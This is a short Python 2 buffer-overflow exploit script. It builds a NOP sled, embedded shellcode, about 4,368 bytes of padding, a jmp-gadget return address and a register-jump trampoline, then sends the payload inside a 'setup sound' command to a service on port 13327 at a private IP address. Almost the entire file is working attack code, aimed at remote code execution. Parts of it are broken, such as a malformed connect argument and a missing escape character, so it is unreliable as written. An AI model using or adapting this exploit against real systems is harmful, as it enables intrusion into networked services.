#!/usr/bin/python
import socket

#08071e4e jmp eax
#08134596 jmp esp
#83C00C add eax, 12
#FFE0 jmp eax

le0mx =  b""
le0mx += b"\xbf\xd2\x1a\x83\xdd\xdb\xd9\xd9\x74\x24\xf4\x5d"
le0mx += b"\x33\xc9\xb1\x12\x31\x7d\x12\x83\xc5\x04\x03\xaf"
le0mx += b"\x14\x61\x28\x7e\xf2\x92\x30\xd3\x47\x0e\xdd\xd1"
le0mx += b"\xce\x51\x91\xb3\x1d\x11\x41\x62\x2e\x2d\xab\x14"
le0mx += b"\x07\x2b\xca\x7c\x58\x63\x2d\x7f\x30\x76\x2e\x7e"
le0mx += b"\x7b\xff\xcf\x30\x1d\x50\x41\x63\x51\x53\xe8\x62"
le0mx += b"\x58\xd4\xb8\x0c\x0d\xfa\x4f\xa4\xb9\x2b\x9f\x56"
le0mx += b"\x53\xbd\x3c\xc4\xf0\x34\x23\x58\xfd\x8b\x24"

step1='\x83\xC0\x0C\xFF\xE0\x90\x90'
overflow = '\x90'*16+le0mx + "\x90" * (4368-16-len(le0mx)) +'\x96\x45\x13\x08' + step1
buffer = "\x11(setup sound " + overflow + "x90\x00"

s = socket.socket()

print "[*] sending exploit ....."

s.connect(("192.168.1.5, 13327"))
print s.recv(1024)
s.send(buffer)
s.close()

print "[!] Payload Sent!"
